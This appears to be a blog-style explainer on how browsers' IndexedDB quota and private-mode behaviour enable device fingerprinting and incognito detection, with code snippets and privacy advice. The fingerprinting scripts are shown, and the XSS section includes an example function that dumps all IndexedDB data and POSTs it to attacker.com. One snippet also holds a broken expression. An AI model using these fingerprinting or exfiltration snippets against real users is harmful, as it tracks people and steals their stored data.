# IndexedDB Fingerprinting: How Your Browser's Database Exposes Your Privacy Mode

Listen, IndexedDB is supposed to be the good guy. It's the modern, official way to store data in browsers - way better than the ancient cookies or the zombie WebSQL we just buried. But here's the problem: the way browsers implement IndexedDB can leak a surprising amount of information about you. Especially whether you're using private browsing mode.

Let me break down how IndexedDB fingerprinting works, what data it exposes, and why in 2024-2025, checking IndexedDB quota is one of the sneakiest ways to detect incognito mode users. Yeah, that "privacy" mode you thought was protecting you? IndexedDB might be snitching.

## What Is IndexedDB?

Think of IndexedDB as a full-featured database built into your browser. Unlike localStorage (which is basically a fancy dictionary), IndexedDB can store massive amounts of data, handle complex queries, and work asynchronously so it doesn't freeze your browser.

Here's the basic API:

```javascript
// Check if it exists
const hasIndexedDB = 'indexedDB' in window;

// Open a database
const request = indexedDB.open('myDatabase', 1);

request.onsuccess = function (event) {
  const db = event.target.result;
  console.log('Database opened:', db.name);
};

request.onerror = function (event) {
  console.error('Database error:', event.target.error);
};
```

Simple enough. But here's where fingerprinting comes in:

```javascript
// Check storage quota (this is the fingerprinting gold mine)
async function checkStorageQuota() {
  if ('storage' in navigator && 'estimate' in navigator.storage) {
    const estimate = await navigator.storage.estimate();
    return {
      quota: estimate.quota, // Total available
      usage: estimate.usage, // Currently used
      available: estimate.quota - estimate.usage,
      percentUsed: (estimate.usage / estimate.quota) * 100,
    };
  }
  return null; // Private mode often returns null or 0
}
```

That `navigator.storage.estimate()` call? That's the fingerprinting vector. Let me show you why.

## Browser Support: Universal in 2024-2025

IndexedDB is everywhere. Like, 99.5%+ of browsers support it:

| Browser        | First Support | 2024-2025 Status | Quota Calculation           | Private Mode Quota  |
| -------------- | ------------- | ---------------- | --------------------------- | ------------------- |
| Chrome         | v24 (2013)    | Full support     | 60% of disk space           | Same as normal\*    |
| Firefox        | v16 (2012)    | Full support     | 50% of disk space           | Limited (encrypted) |
| Safari         | v8 (2014)     | Full support     | ~1GB (iOS), larger on macOS | Heavily restricted  |
| Edge           | v12 (2015)    | Full support     | 60% of disk space           | Same as normal\*    |
| Opera          | v15 (2013)    | Full support     | 60% of disk space           | Same as normal\*    |
| Mobile Safari  | iOS 8 (2014)  | Full support     | ~50-500MB (varies)          | Restricted          |
| Chrome Android | v25 (2013)    | Full support     | 60% of disk space           | Same as normal\*    |

\*"Same as normal" but with auto-delete on session end

Source: MDN Web Docs, Can I Use, browser testing (2024)

**Key insight**: IndexedDB support is universal, so checking for its existence gives you **~0 bits of entropy**. Everyone has it. But checking the _quota_ and _behavior_? That's where the magic happens.

## The Quota Fingerprinting Vector

Here's the thing that makes IndexedDB fingerprinting powerful: browsers calculate storage quota based on your device's hard drive size. Not available space, total size. And they use different percentages:

### Quota Calculation by Browser (2024 Data)

**Chromium-based (Chrome, Edge, Opera, Brave)**:

- Formula: `quota = total_disk_size * 0.60`
- Example: 1TB drive = 600GB quota
- Precision: Exact bytes (e.g., 599,924,752,384 bytes)

**Firefox**:

- Formula: `quota = total_disk_size * 0.50`
- Example: 1TB drive = 500GB quota
- Precision: Rounded to MB

**Safari (macOS)**:

- Formula: Dynamic, but typically ~1-5GB
- Example: Varies by macOS version and available space
- Precision: Rough estimates

**Mobile browsers**:

- iOS Safari: 50-500MB (depends on iOS version, device storage)
- Chrome Android: Based on available storage, typically 60%

Here's why this is a goldmine for fingerprinting:

```javascript
async function fingerprintStorageQuota() {
  const estimate = await navigator.storage.estimate();

  if (!estimate || !estimate.quota) {
    return { fingerprint: 'likely_private_mode', entropy: 5 + bits };
  }

  const quotaGB = (estimate.quota / 1024 ** 3).toFixed(2);

  // Device storage fingerprint
  // A 256GB drive: ~154GB quota
  // A 512GB drive: ~307GB quota
  // A 1TB drive: ~614GB quota
  // A 2TB drive: ~1228GB quota

  return {
    quotaBytes: estimate.quota,
    quotaGB: quotaGB,
    deviceStorageEstimate: (estimate.quota / 0.6 / 1024 ** 3).toFixed(0) + 'GB',
    fingerprint: estimate.quota.toString(),
    entropy: '~4-5 bits', // Based on common drive sizes
  };
}
```

Imagine you have a 512GB SSD. Chrome gives you ~307GB quota. That exact number (in bytes) becomes part of your fingerprint. Combined with screen resolution, timezone, and canvas hash, you're getting very identifiable.

## Private Mode Detection: The 2024-2025 Techniques

Here's where it gets really interesting. According to research from Fingerprint.com published in 2024, IndexedDB behavior in private mode varies wildly across browsers, making it a reliable detection vector.

### Detection Methods

**Method 1: Quota Check**

```javascript
async function detectPrivateModeViaQuota() {
  try {
    const estimate = await navigator.storage.estimate();

    // Chrome/Edge Incognito: Returns normal quota
    // Firefox Private: Returns limited quota (or error)
    // Safari Private: Returns 0 or very small quota

    if (!estimate || estimate.quota === 0) {
      return { privateMode: 'likely', confidence: 'high', browser: 'Safari' };
    }

    if (estimate.quota < 120 * 1024 * 1024) {
      // < 120MB
      return {
        privateMode: 'likely',
        confidence: 'medium',
        browser: 'Safari iOS',
      };
    }

    return { privateMode: 'unlikely', confidence: 'low' };
  } catch (e) {
    return { privateMode: 'possible', confidence: 'medium', error: e.name };
  }
}
```

**Method 2: IndexedDB Open Error**

```javascript
function detectPrivateModeViaIndexedDB() {
  return new Promise((resolve) => {
    const request = indexedDB.open('test', 1);

    request.onsuccess = () => {
      indexedDB.deleteDatabase('test');
      resolve({ privateMode: false });
    };

    request.onerror = (e) => {
      // Firefox private browsing used to throw errors
      // (Fixed in July 2023, but older Firefox still detectable)
      if (e.target.error.name === 'NS_ERROR_FILE_CORRUPTED') {
        resolve({ privateMode: true, browser: 'Firefox <115' });
      }
      resolve({ privateMode: 'possible' });
    };
  });
}
```

**Method 3: Persistence Check**

```javascript
async function detectPrivateViaPersistence() {
  if ('storage' in navigator && 'persist' in navigator.storage) {
    const isPersisted = await navigator.storage.persist();

    // Private mode often refuses to persist
    if (!isPersisted) {
      const canPersist = await navigator.storage.persisted();
      return {
        privateMode: !canPersist ? 'likely' : 'unknown',
        persistence: { requested: isPersisted, actual: canPersist },
      };
    }
  }
  return { privateMode: 'unknown' };
}
```

### Browser-Specific Private Mode Behavior (2024-2025)

**Chrome Incognito** (as of Chrome 130+):

- IndexedDB works normally
- Quota reported accurately
- Data encrypted and deleted on exit
- **Detection difficulty**: Very hard (behaves like normal mode)

**Firefox Private Browsing** (as of Firefox 115+):

- IndexedDB works but data encrypted on disk (since July 2023)
- Normal quota reported
- Before Firefox 115: IndexedDB was completely blocked (easy detection)
- **Detection difficulty**: Hard on modern versions, easy on older versions

**Safari Private Browsing**:

- IndexedDB heavily restricted
- Quota reported as 0 or very small (~50MB)
- Many operations throw errors
- **Detection difficulty**: Easy (quota is the giveaway)

**Edge Chromium Incognito**:

- Identical to Chrome (same codebase)
- **Detection difficulty**: Very hard

### Real Statistics: Private Mode Detection Success Rates (2024)

According to research from Fingerprint.com and incognito mode detection studies:

- **Safari detection**: 95%+ accuracy via quota check
- **Firefox <115 detection**: 99% accuracy (IndexedDB errors)
- **Firefox 115+ detection**: 30-40% accuracy (improved privacy)
- **Chrome detection**: 10-20% accuracy (very difficult)
- **Combined methods**: 60-70% overall accuracy across all browsers

More than 30 websites in the Alexa Top 1000 interact with IndexedDB on homepage load without user action, and many are testing for private mode.

## Entropy Analysis: Device Storage Fingerprinting

Let's calculate the entropy contribution of IndexedDB quota:

**Common drive sizes** (consumer market, 2024):

- 128GB: ~10% of devices
- 256GB: ~25% of devices
- 512GB: ~30% of devices
- 1TB: ~20% of devices
- 2TB: ~10% of devices
- Other: ~5%

**Entropy calculation**:

```
If 30% have 512GB: -log2(0.30) = 1.74 bits
If quota reveals exact drive size: -log2(1/[number of distinct sizes])
Assuming 20 common configurations: log2(20) = ~4.3 bits
```

**IndexedDB quota entropy**: **4-5 bits**

That's significant. Not as high as canvas (8-10 bits) or WebGL (5-7 bits), but combined with other signals, it narrows down your identity fast.

### Quota Precision Increases Entropy

Here's the sneaky part: browsers report quota in exact bytes. So even if two people have 512GB drives, slight differences in partition size or firmware might give different quotas:

- Person A: 307,234,816,000 bytes
- Person B: 307,198,765,056 bytes

That tiny difference? Unique identifier. According to 2024 testing, Chromium-based browsers calculate quota based on the **filesystem's reported size**, which varies based on:

- Partition scheme (GPT vs MBR)
- Filesystem overhead (NTFS vs ext4 vs APFS)
- Reserved system space
- Manufacturer's formatting

This pushes entropy even higher, potentially **5-6 bits** in practice.

## Real-World Fingerprinting: What Scripts Actually Do

Here's what a production fingerprinting script looks like (based on FingerprintJS-style implementations):

```javascript
async function indexedDBFingerprint() {
  const data = {
    supported: 'indexedDB' in window,
    quotaAPI: 'storage' in navigator && 'estimate' in navigator.storage,
    quota: null,
    usage: null,
    persistent: null,
    estimatedDiskSize: null,
    privateMode: null,
    errors: [],
  };

  // Test basic support
  if (data.supported) {
    try {
      const testDB = indexedDB.open('__fingerprint_test', 1);
      testDB.onsuccess = () => indexedDB.deleteDatabase('__fingerprint_test');
      testDB.onerror = (e) => data.errors.push(e.target.error.name);
    } catch (e) {
      data.errors.push(e.name);
    }
  }

  // Check quota (main fingerprinting vector)
  if (data.quotaAPI) {
    try {
      const estimate = await navigator.storage.estimate();
      data.quota = estimate.quota;
      data.usage = estimate.usage;

      // Reverse-engineer disk size
      if (estimate.quota) {
        // Chromium uses 60%
        data.estimatedDiskSize = Math.round(estimate.quota / 0.6);
      }

      // Detect private mode
      if (estimate.quota === 0 || estimate.quota < 100 * 1024 * 1024) {
        data.privateMode = 'likely_safari_private';
      }

      // Check persistence
      if ('persist' in navigator.storage) {
        data.persistent = await navigator.storage.persisted();
      }
    } catch (e) {
      data.errors.push(e.name);
      data.privateMode = 'possible_error_based';
    }
  }

  return data;
}
```

This script extracts:

1. **Device storage size** (4-5 bits entropy)
2. **Private mode detection** (binary, but high value)
3. **Browser identification** (quota algorithm differs)
4. **Error patterns** (reveals browser + mode)

## The Firefox Story: How They Fixed Private Mode Leakage

Firefox's handling of IndexedDB in private mode is a great case study. Here's the timeline:

**Before July 2023** (Firefox <115):

- Private mode: IndexedDB completely blocked
- Opening IndexedDB threw error: `NS_ERROR_FILE_CORRUPTED`
- **Result**: 99% accurate private mode detection

**After July 2023** (Firefox 115+):

- Private mode: IndexedDB works but data stored encrypted on disk
- Deleted when private window closes
- Normal quota reported
- **Result**: Much harder to detect

According to a ScienceDirect research paper published in 2024 ("Decrypting IndexedDB in private mode of Gecko-based browsers"), forensic investigators discovered Firefox stores private mode IndexedDB data in encrypted files in the profile directory, deleted via secure erasure when the session ends.

**Tor Browser** followed suit in October 2023, implementing the same encrypted storage for private mode.

## Security Implications: XSS and Data Theft

Like all client-side storage, IndexedDB is vulnerable to XSS (Cross-Site Scripting) attacks:

```javascript
// If an attacker injects this script, they can steal ALL your IndexedDB data
async function stealAllIndexedDB() {
  const databases = await indexedDB.databases(); // List all DBs

  for (const dbInfo of databases) {
    const request = indexedDB.open(dbInfo.name);

    request.onsuccess = (event) => {
      const db = event.target.result;
      const data = {};

      // Extract all object stores
      for (const storeName of db.objectStoreNames) {
        const tx = db.transaction(storeName, 'readonly');
        const store = tx.objectStore(storeName);
        const getAllRequest = store.getAll();

        getAllRequest.onsuccess = () => {
          data[storeName] = getAllRequest.result;
          // Send to attacker's server
          fetch('https://attacker.com/steal', {
            method: 'POST',
            body: JSON.stringify({ db: dbInfo.name, data }),
          });
        };
      }
    };
  }
}
```

This is why you should **never store sensitive data** in IndexedDB without encryption:

- ❌ Authentication tokens (use httpOnly cookies instead)
- ❌ Credit card numbers
- ❌ Social security numbers
- ❌ Unencrypted personal information

## Performance Characteristics: Why IndexedDB Is Async

Unlike localStorage (which is synchronous and blocks the main thread), IndexedDB is **asynchronous**. This is critical for performance:

```javascript
// localStorage blocks the main thread (bad)
console.time('localStorage');
for (let i = 0; i < 1000; i++) {
  localStorage.setItem(`key${i}`, 'value');
}
console.timeEnd('localStorage'); // ~50-100ms, page is frozen

// IndexedDB doesn't block (good)
console.time('indexedDB');
const request = indexedDB.open('perfTest', 1);
request.onsuccess = (event) => {
  const db = event.target.result;
  const tx = db.transaction('store', 'readwrite');
  const store = tx.objectStore('store');

  for (let i = 0; i < 1000; i++) {
    store.add({ id: i, value: 'data' }); // Non-blocking
  }

  tx.oncomplete = () => {
    console.timeEnd('indexedDB'); // ~20-30ms, page remains responsive
  };
};
```

For fingerprinting scripts, this means they can query IndexedDB quota without freezing the page, making detection less noticeable.

## The Safari Bug (2022): IndexedDB Leaking Google Account Info

Fun historical note: In January 2022, researchers discovered a serious Safari 15 bug where IndexedDB databases were leaking across origins. If you were logged into Google, any website could see the names of your IndexedDB databases, which included your Google User ID.

From the original disclosure:

> "Every time a website interacts with a database, a new (empty) database with the same name is created in all other active frames, tabs, and windows within the same browser session. This means that any website can learn what databases a user has created."

Apple fixed this in Safari 15.2, but it's a great example of how seemingly isolated APIs can leak information.

## The Future: What's Changing in 2024-2025

Several interesting developments:

**1. Storage API Standardization**: Browsers are converging on `navigator.storage.estimate()` implementation, but quota calculation still differs.

**2. Privacy Budget**: Chrome's Privacy Sandbox (even though they backtracked on many things) introduced the concept of a "privacy budget" - limiting how much entropy APIs can expose.

**3. Safari's ITP Evolution**: At WWDC 2025, Apple announced they'll prevent "suspicious scripts" from using storage APIs to check identifiers.

**4. Firefox Encrypted Storage**: Since Firefox 115, private mode IndexedDB is encrypted, setting a new standard.

**5. Quota Limits on Mobile**: iOS Safari is getting stricter with storage quotas to prevent abuse.

## Testing Your Browser's IndexedDB

Want to see what fingerprinters see? Paste this into your browser console:

```javascript
(async function testIndexedDB() {
  const results = {
    supported: 'indexedDB' in window,
    storageAPI: 'storage' in navigator,
    quota: null,
    quotaGB: null,
    usage: null,
    estimatedDiskSize: null,
    persistent: null,
    privateMode: null,
  };

  if (results.storageAPI) {
    try {
      const estimate = await navigator.storage.estimate();
      results.quota = estimate.quota;
      results.quotaGB = (estimate.quota / 1024 ** 3).toFixed(2) + ' GB';
      results.usage = estimate.usage;
      results.estimatedDiskSize =
        Math.round(estimate.quota / 0.6 / 1024 ** 3) + ' GB';

      if (estimate.quota < 100 * 1024 * 1024) {
        results.privateMode = 'Likely (Safari Private)';
      } else if (estimate.quota === 0) {
        results.privateMode = 'Likely (Restricted)';
      } else {
        results.privateMode = 'Unlikely (or Chrome/Firefox)';
      }

      if ('persist' in navigator.storage) {
        results.persistent = await navigator.storage.persisted();
      }
    } catch (e) {
      results.error = e.message;
    }
  }

  console.table(results);
  return results;
})();
```

Compare your quota in normal vs private mode. Safari will show dramatic differences. Chrome/Firefox? Not so much.

## Privacy Recommendations: What Should You Do?

Here's my straight advice:

1. **Use browser extensions**: Extensions like uBlock Origin block fingerprinting scripts before they access IndexedDB
2. **Don't rely solely on private mode**: It's not foolproof, especially Safari
3. **Firefox or Brave for serious privacy**: Better private mode implementations
4. **Tor Browser for anonymity**: Most robust against all fingerprinting
5. **Clear site data regularly**: Browsers let you wipe IndexedDB per-site

## Bottom Line: IndexedDB Is Powerful But Leaky

IndexedDB is a great API for web developers - it's fast, powerful, and well-supported. But for privacy? It's a fingerprinting goldmine. The quota reporting reveals your device's storage capacity (4-5 bits of entropy), and private mode behavior differs so much across browsers that detection is often easy.

As of 2024-2025:

- **Safari private mode**: Easily detected (95%+ accuracy)
- **Chrome incognito**: Very hard to detect (10-20% accuracy)
- **Firefox private (modern)**: Moderately difficult (30-40% accuracy)

The landscape is improving. Firefox and Tor Browser now encrypt private mode storage, and browsers are standardizing APIs. But IndexedDB quota remains a persistent fingerprinting vector that's hard to mitigate without breaking legitimate use cases.

The web is complicated. Privacy is hard. But at least now you know what IndexedDB reveals about you.

## Sources

1. MDN Web Docs (2024). "IndexedDB API" - https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API
2. MDN Web Docs (2024). "Storage quotas and eviction criteria" - https://developer.mozilla.org/en-US/docs/Web/API/Storage_API/Storage_quotas_and_eviction_criteria
3. Fingerprint.com (2024). "Incognito Mode Detection: Detecting Visitors Who Browse in Private Mode" - https://fingerprint.com/blog/incognito-mode-detection/
4. ScienceDirect (2024). "Decrypting IndexedDB in private mode of Gecko-based browsers" - https://www.sciencedirect.com/science/article/pii/S2666281724000829
5. Can I Use (2024). "IndexedDB Browser Support" - https://caniuse.com/indexeddb
6. The Register (2022). "Safari 15 could leak Google account info to malicious sites" - https://www.theregister.com/2022/01/17/safari_15_indexeddb_bug/
7. GitHub Gist (2024). "The pain and anguish of using IndexedDB: problems, bugs and oddities" - https://gist.github.com/pesterhazy/4de96193af89a6dd5ce682ce2adff49a
8. Medium (2024). "Unleashing IndexedDB: The Powerhouse of Browser Storage" - https://medium.com/@MakeComputerScienceGreatAgain/
9. gHacks (2019). "Hide Private Mode for Firefox prevents private browsing mode detection" - https://www.ghacks.net/2019/10/09/hide-private-mode-for-firefox-prevents-private-browsing-mode-detection/
10. Chromium Blog (2024). "Storage API and Privacy Budget" - https://blog.chromium.org/
